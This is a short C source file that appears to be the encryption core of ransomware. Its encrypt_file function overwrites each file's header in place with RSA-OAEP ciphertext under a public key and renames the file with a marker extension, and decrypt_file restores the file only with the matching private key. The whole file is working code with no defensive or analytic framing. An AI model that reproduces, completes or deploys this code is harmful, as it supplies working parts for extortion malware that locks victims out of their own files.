#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include "crypto_2373.h"

int encrypt_file(const char *path, EVP_PKEY *pub_key) {
    FILE *f = fopen(path, "rb+");
    if (!f) return 0;

    unsigned char buffer[HEADER_SIZE];
    unsigned char encrypted[1024];
    size_t encrypted_len;

    size_t bytes_read = fread(buffer, 1, HEADER_SIZE, f);

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pub_key, NULL);
    EVP_PKEY_encrypt_init(ctx);
    EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING);
    EVP_PKEY_encrypt(ctx, encrypted, &encrypted_len, buffer, bytes_read);

    fseek(f, 0, SEEK_SET);
    fwrite(encrypted, 1, encrypted_len, f);
    fclose(f);

    char new_name[512];
    snprintf(new_name, sizeof(new_name), "%s%s", path, EXTENSION);
    rename(path, new_name);
    return 1;
}

int decrypt_file(const char *path, EVP_PKEY *priv_key) {
    FILE *f = fopen(path, "rb+");
    if (!f) return 0;

    unsigned char encrypted[1024];
    unsigned char decrypted[HEADER_SIZE];
    size_t decrypted_len;

    size_t bytes_read = fread(encrypted, 1, 256, f);

    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(priv_key, NULL);
    EVP_PKEY_decrypt_init(ctx);
    EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING);

    if (EVP_PKEY_decrypt(ctx, decrypted, &decrypted_len, encrypted, bytes_read) <= 0) {
        fclose(f);
        return 0;
    }

    fseek(f, 0, SEEK_SET);
    fwrite(decrypted, 1, decrypted_len, f);
    ftruncate(fileno(f), lseek(fileno(f), 0, SEEK_END) - (256 - decrypted_len));
    fclose(f);

    char old_name[512];
    strncpy(old_name, path, strlen(path) - strlen(EXTENSION));
    old_name[strlen(path) - strlen(EXTENSION)] = '\0';
    rename(path, old_name);
    return 1;
}
